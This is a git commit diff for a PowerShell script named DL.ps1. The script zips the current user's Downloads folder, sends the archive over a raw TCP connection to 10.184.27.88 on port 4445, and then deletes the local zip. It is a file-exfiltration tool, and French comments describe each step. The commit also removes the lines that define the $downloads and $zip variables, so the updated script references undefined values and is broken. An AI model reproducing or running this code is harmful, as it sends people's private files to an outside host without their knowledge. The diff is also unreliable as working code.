e170e1f3fe3ab3d9cbcecdbc821f3996ed54e637
BrunoAucoin <bruno.aucoin95@gmail.com>
2026-05-06 12:26:19 +0200

    Update DL.ps1

--- DL.ps1
+++ DL.ps1
@@ -1,11 +1,13 @@
-$downloads = "$env:USERPROFILE\Downloads"
-$zip = "$env:TEMP\downloads.zip"
-
+# Compression du dossier Downloads
 Compress-Archive -Path "$downloads\*" -DestinationPath $zip
+
+# Connexion TCP et envoi du zip
 $client = New-Object System.Net.Sockets.TcpClient("10.184.27.88", 4445)
 $stream = $client.GetStream()
 $bytes = [System.IO.File]::ReadAllBytes($zip)
 $stream.Write($bytes, 0, $bytes.Length)
 $stream.Close()
 $client.Close()
+
+# Nettoyage
 Remove-Item $zip
